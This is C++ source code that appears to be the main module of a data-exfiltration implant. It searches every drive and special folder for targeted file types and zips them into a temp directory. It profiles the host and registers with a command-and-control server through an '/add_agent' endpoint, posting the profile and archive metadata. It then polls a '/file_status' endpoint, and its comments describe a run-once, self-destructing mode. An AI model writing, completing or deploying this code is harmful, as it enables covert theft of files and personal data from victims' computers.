#include "Core/profiler.hpp"
#include "Communication/google_resolve.hpp"
#include "Communication/c2_resolve.hpp"
#include "Core/helpers.hpp"
#include "Core/file_search.hpp"
#include "Core/helpers.hpp"
#include "Core/zipping.hpp"
#include "Core/names.hpp"
#include "Communication/senddata.hpp"


std::string zipDestStr;
std::wstring C2;


std::map<std::string, std::map<std::string, std::string>> FileEnum() {
    std::vector<std::wstring> DIR_PATHS;
    std::map<std::string, std::map<std::string, std::string>> FILE_PATHS;

    std::vector<std::wstring> drives = Disk_ID();
    std::vector<std::wstring> specialDirs = GetSpecialPaths();
    DIR_PATHS.insert(DIR_PATHS.end(), drives.begin(), drives.end());
    DIR_PATHS.insert(DIR_PATHS.end(), specialDirs.begin(), specialDirs.end());

    for (const auto& PATH : DIR_PATHS) {
        std::map<std::string, std::map<std::string, std::string>> tempResults;
        std::wcout << L"Directory Path: " + PATH << std::endl;
        tempResults = FileSearcher(PATH, FILE_EXTS);

        // Append tempResults to FILE_PATHS
        FILE_PATHS.insert(tempResults.begin(), tempResults.end());
    }

    return FILE_PATHS;
}


void GenZip() {
    std::string tmpDir = TmpPath();
    std::map<std::string, std::map<std::string, std::string>> results = FileEnum();

    // read paths from results and save them to filesToZip 
    std::vector<std::wstring> filesToZip;
    for (const auto& [filePath, attributes] : results) {
        filesToZip.push_back(std::wstring(filePath.begin(), filePath.end()));
    }

    // If there are no files to zip, then return back to caller:
    if (filesToZip.empty()) {
        std::cerr << "No files to zip." << std::endl;
        return;
    }

    // Zip the files
    std::wstring zipDest = std::wstring(tmpDir.begin(), tmpDir.end()) + L"zipped.zip";
    zipDestStr = WStringToString(zipDest);
    int zipResult = ZipFiles(zipDest, filesToZip);
    if (zipResult != ZIP_SUCCESS) {
        std::cerr << "There was an error zipping the files." << std::endl;
        return;
    }

    // Get zip file size and write it to a json file in temp:
    nlohmann::json metadata = GenFileMetadata(zipDestStr, CHUNK_SIZE);
    for (auto& [key, value] : metadata.items()) {
        std::cout << key << ": " << value << std::endl;
    }
}


int main() {

    std::wstring uid;

    // Mode 1: run once and then > cleanup > self destruct
    if (ONETIMERUN) {  
        GenZip(); 
        bool ReachIntranet = googleConn(); 
        if (ReachIntranet) { 
            C2 = C2Conn(URLS); 
            if (!C2.empty()) {
                // Path to /add_agent
                std::wstring PC2 = C2 + STAGE1PATH;
                nlohmann::json JsonProfile = Profiler(); 
                
                nlohmann::json metadata = GenFileMetadata(zipDestStr, CHUNK_SIZE); 
                JsonProfile["file_metadata"] = metadata;

                std::string response = SendData(L"POST", PC2, L"", JsonProfile, L"");
                auto jsonResp = nlohmann::json::parse(response);
                if (jsonResp.contains("message") && jsonResp["message"] == "created") {
                    std::cout << "JSON response: " << jsonResp << std::endl;
                }
            }
        }
        uid = GetUIDFromFile(); // once profiler is called, uid file is created
        // Check file status
        std::wstring FileStatusURL = C2 + L"/file_status";
        nlohmann::json UidJson = {{"uid", WStringToString(uid)}};
        std::string response = SendData(L"POST", FileStatusURL, L"", UidJson, L"");
        auto jsonResp = nlohmann::json::parse(response);
        std::cout << "JSON response: " << jsonResp << std::endl;
    }

    return 0;
}


